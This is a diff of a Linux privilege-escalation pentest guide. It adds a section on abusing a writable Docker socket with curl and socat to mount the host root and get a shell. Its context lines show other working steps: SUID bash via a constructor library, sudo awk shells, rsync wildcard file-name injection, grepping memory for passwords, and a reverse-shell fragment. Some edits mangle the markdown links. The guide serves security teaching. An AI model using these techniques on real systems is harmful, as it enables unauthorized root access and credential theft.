@@ -1,8 +1,8 @@
 # Linux Privilege Escalation
 
 Do you want to **know** about my **latest modifications**/**additions or you have any suggestion for HackTricks or PEASS**, **join the** [**PEASS & HackTricks telegram group here**](https://t.me/peass)**.**  
-If you want to **share some tricks with the community** you can also submit **pull requests** to ****[**https://github.com/carlospolop/hacktricks**](https://github.com/carlospolop/hacktricks) ****that will be reflected in this book.  
-Don't forget to **give ⭐ on the github** to motivate me to continue developing this book.
+If you want to **share some tricks with the community** you can also submit **pull requests** to **\*\*\[**[https://github.com/carlospolop/hacktricks\*\*\]\(https://github.com/carlospolop/hacktricks](https://github.com/carlospolop/hacktricks**]%28https://github.com/carlospolop/hacktricks)\) **\*\*that will be reflected in this book.  
+Don't forget to** give ⭐ on the github\*\* to motivate me to continue developing this book.
 
 ## System Information
 
@@ -232,7 +232,7 @@ For a given process ID, **maps shows how memory is mapped within that processes'
 
 ```bash
 procdump()
-( 
+(
     cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
     while read a b; do
         dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
@@ -245,7 +245,7 @@ procdump()
 
 #### /dev/mem
 
- `/dev/mem` provides access to the system's **physical** memory, not the virtual memory. The kernels virtual address space can be accessed using /dev/kmem.  
+`/dev/mem` provides access to the system's **physical** memory, not the virtual memory. The kernels virtual address space can be accessed using /dev/kmem.  
 Typically, `/dev/mem` is only readable by **root** and **kmem** group.
 
 ```text
@@ -256,7 +256,7 @@ strings /dev/mem -n10 | grep -i PASS
 
 To dump a process memory you could use:
 
-* \*\*\*\*[**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) \(root\) - _You can manually remove root requirements and dump process owned by you_
+* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) \(root\) - _You can manually remove root requirements and dump process owned by you_
 * Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) \(root is required\)
 
 ### Credentials from Process Memory
@@ -305,7 +305,7 @@ If a script being executed by root has a “**\***” inside a command, you coul
 rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
 ```
 
-**If the wildcard is preceded of a path like** _**/some/path/\***_  **, it's not vulnerable \(even** _**./\***_ **is not\).**
+**If the wildcard is preceded of a path like** _**/some/path/\***_ **, it's not vulnerable \(even** _**./\***_ **is not\).**
 
 Read the following page for more wildcard exploitation tricks:
 
@@ -368,7 +368,7 @@ ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
 
 Then, create a **executable** with the **same name as the relative path binary** inside the systemd PATH folder you can write, and when the service is asked to execute the vulnerable action \(**Start**, **Stop**, **Reload**\), your **backdoor will be executed** \(unprivileged users usually cannot start/stop services but check if you can using `sudo -l`\).
 
-**Learn more about services with  `man systemd.service`.**
+**Learn more about services with `man systemd.service`.**
 
 ## **Timers**
 
@@ -397,11 +397,11 @@ Therefore, in order to abuse this permissions you would need to:
 * Find some systemd unit \(like a `.service`\) that is **executing a writable binary**
 * Find some systemd unit that is **executing a relative path** and you have **writable privileges** over the **systemd PATH** \(to impersonate that executable\)
 
-**Learn more about timers with  `man systemd.timer`.**
+**Learn more about timers with `man systemd.timer`.**
 
 ### **Enabling Timer**
 
-In order to enable a timer you need  root privileges and to execute: 
+In order to enable a timer you need root privileges and to execute:
 
 ```bash
 sudo systemctl enable backu2.timer
@@ -416,7 +416,7 @@ In brief, a Unix Socket \(technically, the correct name is Unix domain socket, *
 
 Sockets can be configured using `.socket` files.
 
-**Learn more about sockets with  `man systemd.socket`.** Inside this file some several interesting parameters can be configured:
+**Learn more about sockets with `man systemd.socket`.** Inside this file some several interesting parameters can be configured:
 
 * `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: This options are different but as summary as used to **indicate where is going to listen** the socket \(the path of the AF\_UNIX socket file, the IPv4/6 and/or port number to listen...\).
 * `Accept`: Takes a boolean argument. If **true**, a **service instance is spawned for each incoming connection** and only the connection socket is passed to it. If **false**, all listening sockets themselves are **passed to the started service unit**, and only one service unit is spawned for all connections. This value is ignored for datagram sockets and FIFOs where a single service unit unconditionally handles all incoming traffic. **Defaults to false**. For performance reasons, it is recommended to write new daemons only in a way that is suitable for `Accept=no`.
@@ -426,7 +426,7 @@ Sockets can be configured using `.socket` files.
 
 ### Writable .socket files
 
-If you find a **writable** `.socket` file you can **add** at the begging of the `[Socket]` section something like:  `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**  
+If you find a **writable** `.socket` file you can **add** at the begging of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**  
 _Note that the system must be using that socket file configuration or the backdoor won't be executed_
 
 ### Writable sockets
@@ -475,15 +475,50 @@ docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bi
 docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
 ```
 
-Note that if you have write permissions over socket because you are **inside the group `docker`** you have [**more ways to escalate privileges**](interesting-groups-linux-pe/#docker-group).
+#### Use docker web API from socket without docker package
+
+If you have access to **docker socket** but you can't use the docker binary \(maybe it isn't even installed\), you can use directly the web API with `curl`.
+
+The following commands are a example to **create a docker container that mount the root** of the host system and use `socat` to execute commands into the new docker.
+
+```bash
+# List docker images
+curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
+##[{"Containers":-1,"Created":1588544489,"Id":"sha256:<ImageID>",...}]
+# Send JSON to docker API to create the container
+curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
+##{"Id":"<NewContainerID>","Warnings":[]}
+curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
+```
+
+The last step is to use `socat` to initiate a connection to the container, sending an attach request
+
+```bash
+socat - UNIX-CONNECT:/var/run/docker.sock
+POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
+Host:
+Connection: Upgrade
+Upgrade: tcp
+
+#HTTP/1.1 101 UPGRADED
+#Content-Type: application/vnd.docker.raw-stream
+#Connection: Upgrade
+#Upgrade: tcp
+```
+
+Now, you can execute commands on the container from this `socat` connection.
+
+#### Others
+
+Note that if you have write permissions over the docker socket because you are **inside the group `docker`** you have [**more ways to escalate privileges**](interesting-groups-linux-pe/#docker-group).
 
 ## **D-Bus**
 
 D-BUS is an **inter-process communication \(IPC\) system**, providing a simple yet powerful mechanism **allowing applications to talk to one another**, communicate information and request services. D-BUS was designed from scratch to fulfil the needs of a modern Linux system.
 
-D-BUS, as a full-featured IPC and object system, has several intended uses. First, D-BUS can perform basic application IPC, allowing one process to shuttle data to another—think **UNIX domain sockets on steroids**. Second, D-BUS can facilitate sending events, or signals, through the system, allowing different components in the system to communicate and ultimately to integrate better. For example, a Bluetooth dæmon can send an incoming call signal that your music player can intercept, muting the volume until the call ends. Finally, D-BUS implements a remote object system, letting one application request services and invoke methods from a different object—think CORBA without the complications. ****\(From [here](https://www.linuxjournal.com/article/7744)\).
+D-BUS, as a full-featured IPC and object system, has several intended uses. First, D-BUS can perform basic application IPC, allowing one process to shuttle data to another—think **UNIX domain sockets on steroids**. Second, D-BUS can facilitate sending events, or signals, through the system, allowing different components in the system to communicate and ultimately to integrate better. For example, a Bluetooth dæmon can send an incoming call signal that your music player can intercept, muting the volume until the call ends. Finally, D-BUS implements a remote object system, letting one application request services and invoke methods from a different object—think CORBA without the complications. _\*\*_\(From [here](https://www.linuxjournal.com/article/7744)\).
 
-D-Bus use an **allow/deny model**, where each message \(method call, signal emission, etc.\) can be **allowed or denied** according to the sum of all policy rules which match it. Each  or  rule in the policy should have the `own`, `send_destination` or `receive_sender` attribute set.
+D-Bus use an **allow/deny model**, where each message \(method call, signal emission, etc.\) can be **allowed or denied** according to the sum of all policy rules which match it. Each or rule in the policy should have the `own`, `send_destination` or `receive_sender` attribute set.
 
 Part of the policy of `/etc/dbus-1/system.d/wpa_supplicant.conf`:
 
@@ -574,14 +609,14 @@ last | tail
 lastlog
 
 #List all users and their groups
-for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort 
+for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
 #Current user PGP keys
 gpg --list-keys 2>/dev/null
 ```
 
 ### Big UID
 
-Some Linux versions were affected by a bug that allow users with **UID &gt; INT\_MAX** to escalate privileges. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74),  [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).  
+Some Linux versions were affected by a bug that allow users with **UID &gt; INT\_MAX** to escalate privileges. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).  
 **Exploit it** using: **`systemd-run -t /bin/bash`**
 
 ### Groups
@@ -772,7 +807,7 @@ Create the file _/home/user/.config/libcalc.c_ with the code:
 static void inject() __attribute__((constructor));
 
 void inject(){
-	system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
+    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
 }
 ```
 
@@ -795,7 +830,7 @@ The project collects legitimate functions of Unix binaries that can be abused to
 > strace -o /dev/null /bin/sh  
 > sudo awk 'BEGIN {system\("/bin/sh"\)}'
 
-{% embed url="https://gtfobins.github.io/" %}
+{% embed url="https://gtfobins.github.io/" caption="" %}
 
 ### FallOfSudo
 
@@ -814,7 +849,7 @@ Requirements to escalate privileges:
 
 \(You can temporarily enable `ptrace_scope` with `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` or permanently modifying `/etc/sysctl.d/10-ptrace.conf` and setting `kernel.yama.ptrace_scope = 0`\)
 
-If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo_inject)\*\*\*\*
+If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo_inject)
 
 * The **first exploit** \(`exploit.sh`\) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** \(you won't get automatically a root shell, do `sudo su`\):
 
@@ -901,7 +936,7 @@ level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
  0x00000001 (NEEDED)                     Shared library: [libc.so.6]
  0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]
 
-level15@nebula:/home/flag15$ ldd ./flag15 
+level15@nebula:/home/flag15$ ldd ./flag15
  linux-gate.so.1 =>  (0x0068c000)
  libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
  /lib/ld-linux.so.2 (0x005bb000)
@@ -912,7 +947,7 @@ By copying the lib into `/var/tmp/flag15/` it will be used by the program in thi
 ```text
 level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/
 
-level15@nebula:/home/flag15$ ldd ./flag15 
+level15@nebula:/home/flag15$ ldd ./flag15
  linux-gate.so.1 =>  (0x005b0000)
  libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
  /lib/ld-linux.so.2 (0x00737000)
@@ -936,7 +971,7 @@ int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp
 ## Capabilities
 
 Linux capabilities provide a **subset of the available root privileges to a process**. This effectively breaks up root **privileges into smaller and distinctive units**. Each of these units can then be independently be granted to processes. This way the full set of privileges is reduced and decreasing the risks of exploitation.  
-Read the following page to **learn more about capabilities and howto abuse them**:
+Read the following page to **learn more about capabilities and how to abuse them**:
 
 {% page-ref page="linux-capabilities.md" %}
 
@@ -965,7 +1000,7 @@ In **newest versions** you will be able to **connect** to screen sessions only o
 **List screen sessions**
 
 ```bash
-screen -ls 
+screen -ls
 ```
 
 ![](../../.gitbook/assets/image%20%28327%29.png)
@@ -981,7 +1016,7 @@ screen -dr 3350.foo #In the example of the image
 
 Apparently this was a problem with **old tmux versions**. I wasn't able to hijack a tmux \(v2.1\) session created by root from a non-privileged user.
 
-**List tmux sessions** 
+**List tmux sessions**
 
 ```bash
 tmux ls
@@ -1028,10 +1063,10 @@ Specifies whether root can log in using ssh, default is `no`. Possible values:
 Specifies files that contains the public keys that can be used for user authentication. I can contains tokens like `%h` , that will be replaced by the home directory. **You can indicate absolute paths** \(starting in `/`\) or **relative paths from the users home**. For example:
 
 ```bash
-AuthorizedKeysFile	.ssh/authorized_keys access
+AuthorizedKeysFile    .ssh/authorized_keys access
 ```
 
-That configuration will indicate that if you try to login with the **private** key ****of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`
+That configuration will indicate that if you try to login with the **private** key **\*\*of the user "**testusername\*\*" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`
 
 #### ForwardAgent/AllowAgentForwarding
 
@@ -1049,7 +1084,7 @@ Notice that if `Host` is `*` every time the user jumps to a different machine th
 The file `/etc/ssh_config` can **override** this **options** and allow or denied this configuration.  
 The file `/etc/sshd_config` can **allow** or **denied** ssh-agent forwarding with the keyword `AllowAgentForwarding` \(default is allow\).
 
-If you Forward Agent configured in an environment ****[**check here how to exploit it to escalate privileges**](ssh-forward-agent-exploitation.md).
+If you Forward Agent configured in an environment **\*\*\[**check here how to exploit it to escalate privileges\*\*\]\(ssh-forward-agent-exploitation.md\).
 
 ## Interesting Files
 
@@ -1147,7 +1182,7 @@ find / -type f -user root ! -perm -o=r 2>/dev/null
 #Files owned by me or world writable
 find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
 #Writable files by each group I belong to
-for g in `groups`; 
+for g in `groups`;
       do printf "  Group $g:\n";
       find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
       done
@@ -1224,7 +1259,7 @@ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s
 
 ### Logrotate exploitation
 
-There is a vulnerability on `logrotate`that allows a user with **write permissions over a log file** or **any** of its **parent directories** to make `logrotate`write **a file in any location**. If **logrotate** is being executed by **root**, then the user will be able to write any file in _**/etc/bash\_completion.d/**_  that will be executed by any user that login.  
+There is a vulnerability on `logrotate`that allows a user with **write permissions over a log file** or **any** of its **parent directories** to make `logrotate`write **a file in any location**. If **logrotate** is being executed by **root**, then the user will be able to write any file in _**/etc/bash\_completion.d/**_ that will be executed by any user that login.  
 So, if you have **write perms** over a **log file** **or** any of its **parent folder**, you can **privesc** \(on most linux distributions, logrotate is executed automatically once a day as **user root**\). Also, check if apart of _/var/log_ there are more files being **rotated**.
 
 {% hint style="info" %}
@@ -1265,7 +1300,7 @@ Other alternative to this folder is `/etc/rc.d/init.d` in Redhat
 `/etc/init` contains **configuration** files used by **Upstart**. Upstart is a young **service management package** championed by Ubuntu. Files in `/etc/init` are configuration files telling Upstart how and when to `start`, `stop`, `reload` the configuration, or query the `status` of a service. As of lucid, Ubuntu is transitioning from SysVinit to Upstart, which explains why many services come with SysVinit scripts even though Upstart configuration files are preferred. In fact, the SysVinit scripts are processed by a compatibility layer in Upstart. \(From [here](https://askubuntu.com/questions/5039/what-is-the-difference-between-etc-init-and-etc-init-d#:~:text=%2Fetc%2Finit%20contains%20configuration%20files,the%20status%20of%20a%20service.)\)
 
 **systemd** is a **Linux initialization system and service manager that includes features like on-demand starting of daemons**, mount and automount point maintenance, snapshot support, and processes tracking using Linux control groups. systemd provides a logging daemon and other tools and utilities to help with common system administration tasks. \(From [here](https://www.linode.com/docs/quick-answers/linux-essentials/what-is-systemd/#:~:text=The%20%2Frun%2Fsystemd%2Fsystem,anywhere%20else%20in%20the%20system.)\)  
- Files that ships in packages downloaded from distribution repository go into `/usr/lib/systemd/`. Modifications done by system administrator \(user\) go into `/etc/systemd/system/`.
+Files that ships in packages downloaded from distribution repository go into `/usr/lib/systemd/`. Modifications done by system administrator \(user\) go into `/etc/systemd/system/`.
 
 ## Other Tricks
 
@@ -1310,6 +1345,4 @@ Other alternative to this folder is `/etc/rc.d/init.d` in Redhat
 [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)  
 [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)  
 [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
-
-
 
